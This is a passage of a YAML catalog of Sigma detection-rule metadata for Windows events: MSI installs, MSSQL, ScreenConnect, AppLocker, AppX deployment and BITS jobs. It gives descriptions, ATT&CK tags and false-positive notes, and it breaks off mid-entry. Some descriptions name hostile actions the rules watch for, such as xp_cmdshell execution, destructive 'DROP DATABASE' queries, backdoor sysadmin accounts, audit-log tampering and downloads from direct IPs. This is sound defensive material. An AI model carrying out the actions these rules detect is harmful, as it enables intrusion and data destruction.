- detection_id: 570ae5ec-33dc-427c-b815-db86228ad43e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/msiinstaller/win_builtin_remove_application.yml
  name: Application Uninstalled
  description: An application has been removed. Check if it is critical.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1489
  tags:
  - attack.impact
  - attack.t1489
  time_window: ''
  references:
  - https://github.com/nasbench/EVTX-ETW-Resources/blob/f1b010ce0ee1b71e3024180de1a3e67f99701fe4/ETWProvidersManifests/Windows11/22H2/W11_22H2_Pro_20221220_22621.963/WEPExplorer/Microsoft-Windows-MsiServer.xml
  - https://learn.microsoft.com/en-us/windows/win32/msi/event-logging
  false_positives:
  - Unknown
  notes: ''
- detection_id: c7c8aa1c-5aff-408e-828b-998e3620b341
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/msiinstaller/win_msi_install_from_susp_locations.yml
  name: MSI Installation From Suspicious Locations
  description: Detects MSI package installation from suspicious locations
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://www.trendmicro.com/en_us/research/22/h/ransomware-actor-abuses-genshin-impact-anti-cheat-driver-to-kill-antivirus.html
  false_positives:
  - False positives may occur if you allow installation from folders such as the desktop,
    the public folder or remote shares. A baseline is required before production use.
  notes: ''
- detection_id: 5594e67a-7f92-4a04-b65d-1a42fd824a60
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/msiinstaller/win_msi_install_from_web.yml
  name: MSI Installation From Web
  description: Detects installation of a remote msi file from web.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1218
  - T1218.007
  tags:
  - attack.defense-evasion
  - attack.t1218
  - attack.t1218.007
  time_window: ''
  references:
  - https://twitter.com/_st0pp3r_/status/1583922009842802689
  false_positives:
  - Unknown
  notes: ''
- detection_id: 87261fb2-69d0-42fe-b9de-88c6b5f65a43
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/msiinstaller/win_software_atera_rmm_agent_install.yml
  name: Atera Agent Installation
  description: Detects successful installation of Atera Remote Monitoring & Management
    (RMM) agent as recently found to be used by Conti operators
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://www.advintel.io/post/secret-backdoor-behind-conti-ransomware-operation-introducing-atera-agent
  false_positives:
  - Legitimate Atera agent installation
  notes: ''
- detection_id: 08200f85-2678-463e-9c32-88dce2f073d1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/mssqlserver/win_mssql_add_sysadmin_account.yml
  name: MSSQL Add Account To Sysadmin Role
  description: Detects when an attacker tries to backdoor the MSSQL server by adding
    a backdoor account to the sysadmin fixed server role
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/
  false_positives:
  - Rare legitimate administrative activity
  notes: ''
- detection_id: 00321fee-ca72-4cce-b011-5415af3b9960
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/mssqlserver/win_mssql_destructive_query.yml
  name: MSSQL Destructive Query
  description: 'Detects the invocation of MS SQL transactions that are destructive
    towards table or database data, such as "DROP TABLE" or "DROP DATABASE".

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics:
  - Exfiltration
  - Impact
  techniques:
  - T1485
  tags:
  - attack.exfiltration
  - attack.impact
  - attack.t1485
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sql/t-sql/statements/drop-table-transact-sql?view=sql-server-ver16
  - https://learn.microsoft.com/en-us/sql/t-sql/statements/drop-database-transact-sql?view=sql-server-ver16
  - https://learn.microsoft.com/en-us/sql/t-sql/statements/truncate-table-transact-sql?view=sql-server-ver16
  false_positives:
  - Legitimate transaction from a sysadmin.
  notes: ''
- detection_id: 350dfb37-3706-4cdc-9e2e-5e24bc3a46df
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/mssqlserver/win_mssql_disable_audit_settings.yml
  name: MSSQL Disable Audit Settings
  description: Detects when an attacker calls the "ALTER SERVER AUDIT" or "DROP SERVER
    AUDIT" transaction in order to delete or disable audit logs on the server
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/
  - https://learn.microsoft.com/en-us/sql/t-sql/statements/drop-server-audit-transact-sql?view=sql-server-ver16
  - https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-server-audit-transact-sql?view=sql-server-ver16
  false_positives:
  - This event should only fire when an administrator is modifying the audit policy.
    Which should be a rare occurrence once it's set up
  notes: ''
- detection_id: 218d2855-2bba-4f61-9c85-81d0ea63ac71
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/mssqlserver/win_mssql_failed_logon.yml
  name: MSSQL Server Failed Logon
  description: Detects failed logon attempts from clients to MSSQL server.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1110
  tags:
  - attack.credential-access
  - attack.t1110
  time_window: ''
  references:
  - https://cybersecthreat.com/2020/07/08/enable-mssql-authentication-log-to-eventlog/
  - https://www.experts-exchange.com/questions/27800944/EventID-18456-Failed-to-open-the-explicitly-specified-database.html
  false_positives:
  - This event could stem from users changing an account's password that's used to
    authenticate via a job or an automated process. Investigate the source of such
    events and mitigate them
  notes: ''
- detection_id: ebfe73c2-5bc9-4ed9-aaa8-8b54b2b4777d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/mssqlserver/win_mssql_failed_logon_from_external_network.yml
  name: MSSQL Server Failed Logon From External Network
  description: Detects failed logon attempts from clients with external network IP
    to an MSSQL server. This can be a sign of a bruteforce attack.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1110
  tags:
  - attack.credential-access
  - attack.t1110
  time_window: ''
  references:
  - https://cybersecthreat.com/2020/07/08/enable-mssql-authentication-log-to-eventlog/
  - https://www.experts-exchange.com/questions/27800944/EventID-18456-Failed-to-open-the-explicitly-specified-database.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: b3d57a5c-c92e-4b48-9a79-5f124b7cf964
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/mssqlserver/win_mssql_sp_procoption_set.yml
  name: MSSQL SPProcoption Set
  description: Detects when the a stored procedure is set or cleared for automatic
    execution in MSSQL. A stored procedure that is set to automatic execution runs
    every time an instance of SQL Server is started
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/
  - https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-procoption-transact-sql?view=sql-server-ver16
  false_positives:
  - Legitimate use of the feature by administrators (rare)
  notes: ''
- detection_id: 7f103213-a04e-4d59-8261-213dddf22314
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/mssqlserver/win_mssql_xp_cmdshell_audit_log.yml
  name: MSSQL XPCmdshell Suspicious Execution
  description: Detects when the MSSQL "xp_cmdshell" stored procedure is used to execute
    commands
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/
  - https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/
  false_positives:
  - Unknown
  notes: ''
- detection_id: d08dd86f-681e-4a00-a92c-1db218754417
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/mssqlserver/win_mssql_xp_cmdshell_change.yml
  name: MSSQL XPCmdshell Option Change
  description: 'Detects when the MSSQL "xp_cmdshell" stored procedure setting is changed.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/
  - https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/
  false_positives:
  - Legitimate enable/disable of the setting
  - Note that since the event contain the change for both values. This means that
    this will trigger on both enable and disable
  notes: ''
- detection_id: 076ebe48-cc05-4d8f-9d41-89245cd93a14
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/screenconnect/win_app_remote_access_tools_screenconnect_command_exec.yml
  name: Remote Access Tool - ScreenConnect Command Execution
  description: Detects command execution via ScreenConnect RMM
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.003
  tags:
  - attack.execution
  - attack.t1059.003
  time_window: ''
  references:
  - https://www.huntandhackett.com/blog/revil-the-usage-of-legitimate-remote-admin-tooling
  - https://github.com/SigmaHQ/sigma/pull/4467
  false_positives:
  - Legitimate use of ScreenConnect
  notes: ''
- detection_id: 5d19eb78-5b5b-4ef2-a9f0-4bfa94d58a13
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/screenconnect/win_app_remote_access_tools_screenconnect_file_transfer.yml
  name: Remote Access Tool - ScreenConnect File Transfer
  description: Detects file being transferred via ScreenConnect RMM
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.003
  tags:
  - attack.execution
  - attack.t1059.003
  time_window: ''
  references:
  - https://www.huntandhackett.com/blog/revil-the-usage-of-legitimate-remote-admin-tooling
  - https://github.com/SigmaHQ/sigma/pull/4467
  false_positives:
  - Legitimate use of ScreenConnect
  notes: ''
- detection_id: 6c82cf5c-090d-4d57-9188-533577631108
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/windows_error_reporting/win_application_msmpeng_crash_wer.yml
  name: Microsoft Malware Protection Engine Crash - WER
  description: This rule detects a suspicious crash of the Microsoft Malware Protection
    Engine
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1211
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1211
  - attack.t1562.001
  time_window: ''
  references:
  - https://bugs.chromium.org/p/project-zero/issues/detail?id=1252&desc=5
  - https://technet.microsoft.com/en-us/library/security/4022344
  false_positives:
  - MsMpEng might crash if the "C:\" partition is full
  notes: ''
- detection_id: 401e5d00-b944-11ea-8f9a-00163ecd60ae
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/applocker/win_applocker_application_was_prevented_from_running.yml
  name: AppLocker Prevented Application or Script from Running
  description: 'Detects when AppLocker prevents the execution of an Application, DLL,
    Script, MSI, or Packaged-App from running.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: applocker
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1059.003
  - T1059.005
  - T1059.006
  - T1059.007
  - T1204.002
  tags:
  - attack.execution
  - attack.t1204.002
  - attack.t1059.001
  - attack.t1059.003
  - attack.t1059.005
  - attack.t1059.006
  - attack.t1059.007
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/applocker/what-is-applocker
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/applocker/using-event-viewer-with-applocker
  - https://nxlog.co/documentation/nxlog-user-guide/applocker.html
  false_positives:
  - Unlikely, since this event notifies about blocked application execution. Tune
    your applocker rules to avoid blocking legitimate applications.
  notes: ''
- detection_id: d29a20b2-be4b-4827-81f2-3d8a59eab5fc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/appmodel_runtime/win_appmodel_runtime_sysinternals_tools_appx_execution.yml
  name: Sysinternals Tools AppX Versions Execution
  description: 'Detects execution of Sysinternals tools via an AppX package.

    Attackers could install the Sysinternals Suite to get access to tools such as
    psexec and procdump to avoid detection based on System paths.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: appmodel-runtime
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.execution
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/microsoft-store
  false_positives:
  - Legitimate usage of sysinternals applications from the Windows Store will trigger
    this. Apply exclusions as needed.
  notes: ''
- detection_id: 6ae53108-c3a0-4bee-8f45-c7591a2c337f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/appxdeployment_server/win_appxdeployment_server_applocker_block.yml
  name: Deployment AppX Package Was Blocked By AppLocker
  description: Detects an appx package deployment that was blocked by AppLocker policy.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: appxdeployment-server
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting
  - https://github.com/nasbench/EVTX-ETW-Resources/blob/7a806a148b3d9d381193d4a80356016e6e8b1ee8/ETWEventsList/CSV/Windows11/22H2/W11_22H2_Pro_20220920_22621.382/Providers/Microsoft-Windows-AppXDeployment-Server.csv
  false_positives:
  - Unlikely, since this event notifies about blocked application deployment. Tune
    your applocker rules to avoid blocking legitimate applications.
  notes: ''
- detection_id: 8b48ad89-10d8-4382-a546-50588c410f0d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/appxdeployment_server/win_appxdeployment_server_appx_downloaded_from_file_sharing_domains.yml
  name: Remote AppX Package Downloaded from File Sharing or CDN Domain
  description: 'Detects an appx package that was added to the pipeline of the "to
    be processed" packages which was downloaded from a file sharing or CDN domain.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: appxdeployment-server
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/
  - https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting
  - https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/
  false_positives:
  - Unlikely, unless the organization uses file sharing or CDN services to distribute
    internal applications.
  notes: ''
- detection_id: 898d5fc9-fbc3-43de-93ad-38e97237c344
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/appxdeployment_server/win_appxdeployment_server_appx_package_deployment_failed_signing_requirements.yml
  name: AppX Package Deployment Failed Due to Signing Requirements
  description: 'Detects an appx package deployment / installation with the error code
    "0x80073cff" which indicates that the package didn''t meet the signing requirements.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: appxdeployment-server
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/
  - https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting
  - https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/
  false_positives:
  - Legitimate AppX packages not signed by MS used part of an enterprise.
  notes: ''
- detection_id: 5cdeaf3d-1489-477c-95ab-c318559fc051
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/appxdeployment_server/win_appxdeployment_server_appx_package_in_staging_directory.yml
  name: AppX Located in Known Staging Directory Added to Deployment Pipeline
  description: 'Detects an appx package that was added to the pipeline of the "to
    be processed" packages that is located in a known folder often used as a staging
    directory.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: appxdeployment-server
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/
  - https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting
  - https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 09d3b48b-be17-47f5-bf4e-94e7e75d09ce
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/appxdeployment_server/win_appxdeployment_server_mal_appx_names.yml
  name: Potential Malicious AppX Package Installation Attempts
  description: Detects potential installation or installation attempts of known malicious
    appx packages
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: appxdeployment-server
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/
  - https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/
  - https://forensicitguy.github.io/analyzing-magnitude-magniber-appx/
  false_positives:
  - Rare occasions where a malicious package uses the exact same name and version
    as a legitimate application.
  notes: ''
- detection_id: e021bbb5-407f-41f5-9dc9-1864c45a7a51
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/appxdeployment_server/win_appxdeployment_server_policy_block.yml
  name: Deployment Of The AppX Package Was Blocked By The Policy
  description: 'Detects an appx package deployment that was blocked by the local computer
    policy.

    The following events indicate that an AppX package deployment was blocked by a
    policy:

    - Event ID 441: The package deployment operation is blocked by the "Allow deployment
    operations in special profiles" policy

    - Event ID 442: Deployments to non-system volumes are blocked by the "Disable
    deployment of Windows Store apps to non-system volumes" policy."

    - Event ID 453: Package blocked by a platform policy.

    - Event ID 454: Package blocked by a platform policy.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: appxdeployment-server
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting
  - https://github.com/nasbench/EVTX-ETW-Resources/blob/7a806a148b3d9d381193d4a80356016e6e8b1ee8/ETWEventsList/CSV/Windows11/22H2/W11_22H2_Pro_20220920_22621.382/Providers/Microsoft-Windows-AppXDeployment-Server.csv
  false_positives:
  - Unlikely, since this event notifies about blocked application deployment. Tune
    your applocker rules to avoid blocking legitimate applications.
  notes: ''
- detection_id: c977cb50-3dff-4a9f-b873-9290f56132f1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/appxdeployment_server/win_appxdeployment_server_uncommon_package_locations.yml
  name: AppX Located in Uncommon Directory Added to Deployment Pipeline
  description: 'Detects an appx package that was added to the pipeline of the "to
    be processed" packages that is located in uncommon locations.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: appxdeployment-server
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - Internal Research
  - https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/
  - https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting
  - https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/
  false_positives:
  - Unknown
  notes: ''
- detection_id: b5aa7d60-c17e-4538-97de-09029d6cd76b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/appxpackaging_om/win_appxpackaging_om_sups_appx_signature.yml
  name: Suspicious Digital Signature Of AppX Package
  description: Detects execution of AppX packages with known suspicious or malicious
    signature
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: appxpackaging-om
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.execution
  time_window: ''
  references:
  - Internal Research
  - https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1ff315dc-2a3a-4b71-8dde-873818d25d39
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/bits_client/win_bits_client_new_job_via_bitsadmin.yml
  name: New BITS Job Created Via Bitsadmin
  description: Detects the creation of a new bits job by Bitsadmin
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: windows
  product: bits-client
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1197
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1197
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1197/T1197.md
  false_positives:
  - Many legitimate applications or scripts could leverage "bitsadmin". This event
    is best correlated with EID 16403 via the JobID field
  notes: ''
- detection_id: fe3a2d49-f255-4d10-935c-bda7391108eb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/bits_client/win_bits_client_new_job_via_powershell.yml
  name: New BITS Job Created Via PowerShell
  description: Detects the creation of a new bits job by PowerShell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: windows
  product: bits-client
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1197
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1197
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1197/T1197.md
  false_positives:
  - Administrator PowerShell scripts
  notes: ''
- detection_id: b85e5894-9b19-4d86-8c87-a2f3b81f0521
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/bits_client/win_bits_client_new_transfer_saving_susp_extensions.yml
  name: BITS Transfer Job Downloading File Potential Suspicious Extension
  description: Detects new BITS transfer job saving local files with potential suspicious
    extensions
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: bits-client
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1197
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1197
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1197/T1197.md
  false_positives:
  - While the file extensions in question can be suspicious at times. It's best to
    add filters according to your environment to avoid large amount false positives
  notes: ''
- detection_id: d635249d-86b5-4dad-a8c7-d7272b788586
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/bits_client/win_bits_client_new_transfer_via_file_sharing_domains.yml
  name: BITS Transfer Job Download From File Sharing Domains
  description: Detects BITS transfer job downloading files from a file sharing domain.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: bits-client
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1197
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1197
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1197/T1197.md
  - https://twitter.com/malmoeb/status/1535142803075960832
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker
  - https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 90f138c1-f578-4ac3-8c49-eecfd847c8b7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/bits_client/win_bits_client_new_transfer_via_ip_address.yml
  name: BITS Transfer Job Download From Direct IP
  description: Detects a BITS transfer job downloading file(s) from a direct IP address.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: bits-client
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1197
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1197
  time_window: ''
  references:
  - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin
  - https://isc.sans.edu/diary/22264
  - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
  - https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6d44fb93-e7d2-475c-9d3d-54c9c1e33427
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/bits_client/win_bits_client_new_transfer_via_uncommon_tld.yml
  name: BITS Transfer Job With Uncommon Or Suspicious Remote TLD
  description: Detects a suspicious download using the BITS client from a FQDN that
    is unusual. Adversaries may abuse BITS jobs to persistently execute or clean up
    after malicious payloads.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
